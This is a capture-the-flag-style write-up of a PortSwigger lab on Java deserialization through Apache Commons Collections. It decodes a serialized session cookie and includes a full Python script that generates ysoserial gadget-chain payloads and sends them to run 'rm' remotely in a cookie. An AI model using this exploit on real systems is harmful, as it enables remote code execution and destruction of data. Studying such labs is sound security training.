# Exploiting Java deserialization with Apache Commons

## Introduction

Welcome to my another writeup! In this Portswigger Labs [lab](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-exploiting-java-deserialization-with-apache-commons), you'll learn: Exploiting Java deserialization with Apache Commons! Without further ado, let's dive in.

- Overall difficulty for me (From 1-10 stars): ★☆☆☆☆☆☆☆☆☆

## Background

This lab uses a serialization-based session mechanism and loads the Apache Commons Collections library. Although you don't have source code access, you can still exploit this lab using pre-built gadget chains.

To solve the lab, use a third-party tool to generate a malicious serialized object containing a remote code execution payload. Then, pass this object into the website to delete the `morale.txt` file from Carlos's home directory.

You can log in to your own account using the following credentials: `wiener:peter`

## Exploitation

**Login as user `wiener`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Insecure-Deserialization/Deserial-5/images/Pasted%20image%2020230110074418.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Insecure-Deserialization/Deserial-5/images/Pasted%20image%2020230110074429.png)

**Burp Suite HTTP history:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Insecure-Deserialization/Deserial-5/images/Pasted%20image%2020230110074450.png)

When we're successfully logged in, the web application will set a new session cookie.

**URL decoded:**
```
rO0ABXNyAC9sYWIuYWN0aW9ucy5jb21tb24uc2VyaWFsaXphYmxlLkFjY2Vzc1Rva2VuVXNlchlR/OUSJ6mBAgACTAALYWNjZXNzVG9rZW50ABJMamF2YS9sYW5nL1N0cmluZztMAAh1c2VybmFtZXEAfgABeHB0ACBjMnN5Y3J0NHpzZzF3cWN3N2EyZ3hhcG95cXU5a3Zrd3QABndpZW5lcg==
```

As you can see, the session cookie's last 2 characters are `=`, which is a padding for base64 encoding.

**Let's base64 decode that:**
```
┌──(root🌸siunam)-[~/ctf/Portswigger-Labs/Insecure-Deserialization]
└─# echo 'rO0ABXNyAC9sYWIuYWN0aW9ucy5jb21tb24uc2VyaWFsaXphYmxlLkFjY2Vzc1Rva2VuVXNlchlR/OUSJ6mBAgACTAALYWNjZXNzVG9rZW50ABJMamF2YS9sYW5nL1N0cmluZztMAAh1c2VybmFtZXEAfgABeHB0ACBjMnN5Y3J0NHpzZzF3cWN3N2EyZ3hhcG95cXU5a3Zrd3QABndpZW5lcg==' | base64 -d | xxd   
00000000: aced 0005 7372 002f 6c61 622e 6163 7469  ....sr./lab.acti
00000010: 6f6e 732e 636f 6d6d 6f6e 2e73 6572 6961  ons.common.seria
00000020: 6c69 7a61 626c 652e 4163 6365 7373 546f  lizable.AccessTo
00000030: 6b65 6e55 7365 7219 51fc e512 27a9 8102  kenUser.Q...'...
00000040: 0002 4c00 0b61 6363 6573 7354 6f6b 656e  ..L..accessToken
00000050: 7400 124c 6a61 7661 2f6c 616e 672f 5374  t..Ljava/lang/St
00000060: 7269 6e67 3b4c 0008 7573 6572 6e61 6d65  ring;L..username
00000070: 7100 7e00 0178 7074 0020 6332 7379 6372  q.~..xpt. c2sycr
00000080: 7434 7a73 6731 7771 6377 3761 3267 7861  t4zsg1wqcw7a2gxa
00000090: 706f 7971 7539 6b76 6b77 7400 0677 6965  poyqu9kvkwt..wie
000000a0: 6e65 72                                  ner
```

**In here, we see it's a Java serialized object, as the first 2 bytes are `ac ed`.**

**Now, we can use a tool called `ysoserial` to build gadget chains.**

- Download `ysoserial` jar from GitHub [repository](https://github.com/frohoff/ysoserial/):

```
┌──(root🌸siunam)-[~/ctf/Portswigger-Labs/Insecure-Deserialization]
└─# java -jar /opt/ysoserial/ysoserial-all.jar   
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
Y SO SERIAL?
Usage: java -jar ysoserial-[version]-all.jar [payload] '[command]'
  Available payload types:
Jan 10, 2023 7:55:53 AM org.reflections.Reflections scan
INFO: Reflections took 94 ms to scan 1 urls, producing 18 keys and 153 values 
     Payload             Authors                                Dependencies           
     -------             -------                                ------------           
[...]                                                                                  
     CommonsCollections1 @frohoff                               commons-collections:3.1
     CommonsCollections2 @frohoff                               commons-collections4:4.0
     CommonsCollections3 @frohoff                               commons-collections:3.1
     CommonsCollections4 @frohoff                               commons-collections4:4.0
     CommonsCollections5 @matthias_kaiser, @jasinner            commons-collections:3.1
     CommonsCollections6 @matthias_kaiser                       commons-collections:3.1
     CommonsCollections7 @scristalli, @hanyrax, @EdoardoVignati commons-collections:3.1
[...]
```

Since in the lab background says the web application uses Apache Commons Collections library, so we're only focusing on `CommonsCollections` payloads.

> Note: If you have "Error while generating or serializing payload" error message, change your Java version <= 12, as Java >=12 does not allow access to private fields of certain sensitive classes.

**Switch Java to version 11:**
```
┌──(root🌸siunam)-[~/ctf/Portswigger-Labs/Insecure-Deserialization]
└─# export JAVA_HOME="/usr/lib/jvm/java-11-openjdk-amd64"
                                                                                                           
┌──(root🌸siunam)-[~/ctf/Portswigger-Labs/Insecure-Deserialization]
└─# export PATH="${JAVA_HOME}/bin:{$PATH}"               
                                                                                                           
┌──(root🌸siunam)-[~/ctf/Portswigger-Labs/Insecure-Deserialization]
└─# java --version                                                    
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
openjdk 11.0.17 2022-10-18
OpenJDK Runtime Environment (build 11.0.17+8-post-Debian-2)
OpenJDK 64-Bit Server VM (build 11.0.17+8-post-Debian-2, mixed mode, sharing)
```

**To automate things, I'll write a python script:**
```py
#!/usr/bin/env python3

import requests
import subprocess
from re import search
from base64 import b64encode
from urllib.parse import quote
import argparse
import os

class exploit():
    def __init__(self, jarPath, payload, command):
        self.jarPath = jarPath
        self.payload = payload
        self.command = command

    def checkJavaVersion(self):
        print('[*] Checking Java version...')

        # Run command 'java --version'
        javaVersionOutput = subprocess.check_output(['java', '--version'])
        matchedResult = search(r'([0-9.]+)', str(javaVersionOutput))
        javaVersion = matchedResult.group(0)

        print(f'[*] Java version is: {javaVersion}')

        if int(javaVersion[:2]) >= 12:
            print('[-] This version doesn\'t work. Please switch to Java version <= 12. Example:')
            print('''┌──(root🌸siunam)-[~/ctf/Portswigger-Labs/Insecure-Deserialization]
└─# export JAVA_HOME="/usr/lib/jvm/java-11-openjdk-amd64"
                                                                                                           
┌──(root🌸siunam)-[~/ctf/Portswigger-Labs/Insecure-Deserialization]
└─# export PATH="${JAVA_HOME}/bin:{$PATH}"''')
            exit(0)
        else:
            print('[+] This version works!')

    def generatePayload(self):
        print('[*] Generating payload...')
        print(f'[*] Payload = {self.payload}, command = {self.command}')
        
        # Run command 'java -jar <ysoserial jar full path> <payload> <command>', and base64 encode it
        generatedPayload = b64encode(subprocess.check_output(['java', '-jar', self.jarPath, self.payload, self.command]))

        # Output the generated payload to disk
        print('[*] Writing the generated payload to disk for later use...')

        # Remove existed ysoserial_payload.b64 file
        if os.path.exists('ysoserial_payload.b64'):
            os.remove('ysoserial_payload.b64')

        for character in generatedPayload:
            with open('ysoserial_payload.b64', 'a') as file:
                file.write(chr(character))

        # URL encode the generated payload
        return quote(generatedPayload)

    def sendPayload(self, url, fullPayload):
        print('[*] Sending the payload...')

        payloadCookie = {
            'session': fullPayload
        }

        requests.get(url, cookies=payloadCookie)
        print('[+] Payload has been sent.')

def argumentParser():
    parser = argparse.ArgumentParser(description='A python script that generates and send ysoserial tool\'s payload, which is an Java serialized object gadget chains.')
    parser.add_argument('-j', '--jar', metavar='Path', help='The absolute path of the ysoserial Jar file. For example: /opt/ysoserial/ysoserial-all.jar', required=True)
    parser.add_argument('-p', '--payload', metavar='Payload', help='The ysoserial payload. For example: CommonsCollections4', required=True)
    parser.add_argument('-c', '--command', metavar='Command', help='The command you wanna execute. For example: \'rm /home/carlos/morale.txt\'', required=True)
    parser.add_argument('-u', '--url', metavar='Url', help='The full URL of the target website. For example: https://0a6d0005037e473ec06c22bc000300b7.web-security-academy.net/')

    return parser.parse_args()


def main():
    # Prepare arguments
    args = argumentParser()
    ysoserialJarPath = args.jar
    payload = args.payload
    command = args.command
    url = args.url     

    Exploit = exploit(ysoserialJarPath, payload, command)
    Exploit.checkJavaVersion()
    
    fullPayload = Exploit.generatePayload()

    while True:
        confirmInput = input('Do you want to send the payload to the target website? (y/n) ')

        if confirmInput.upper() == 'Y':
            Exploit.sendPayload(url, fullPayload)
            break
        elif confirmInput.upper() == 'N':
            print('[*] Bye!')
            break

if __name__ == '__main__':
    main()
```

```
┌──(root🌸siunam)-[~/ctf/Portswigger-Labs/Insecure-Deserialization]
└─# python3 send_payload.py -j /opt/ysoserial/ysoserial-all.jar -p CommonsCollections4 -c 'rm /home/carlos/morale.txt' -u https://0a6d0005037e473ec06c22bc000300b7.web-security-academy.net/
[*] Checking Java version...
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
[*] Java version is: 11.0.17
[+] This version works!
[*] Generating payload...
[*] Payload = CommonsCollections4, command = rm /home/carlos/morale.txt
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
[*] Writing the generated payload to disk for later use...
Do you want to send the payload to the target website? (y/n) y
[*] Sending the payload...
[+] Payload has been sent.
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Insecure-Deserialization/Deserial-5/images/Pasted%20image%2020230110092218.png)

It worked!

# What we've learned:

1. Exploiting Java deserialization with Apache Commons